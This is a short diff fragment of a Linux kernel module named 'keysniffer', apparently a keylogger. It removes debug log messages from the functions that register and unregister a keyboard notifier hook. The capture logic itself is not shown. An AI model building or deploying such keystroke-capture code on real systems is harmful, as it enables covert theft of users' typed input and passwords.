@@ -64,19 +64,13 @@ int keysniffer_cb(struct notifier_block *nblock, unsigned long code, void *_para
 
 static int __init keysniffer_init(void)
 {
-	pr_debug("keysniffer init\n");
-
 	register_keyboard_notifier(&keysniffer_blk);
-
 	return 0;
 }
 
 static void __exit keysniffer_exit(void)
 {
-	pr_debug("keysniffer exit\n");
-
 	unregister_keyboard_notifier(&keysniffer_blk);
-
 	return;
 }
 
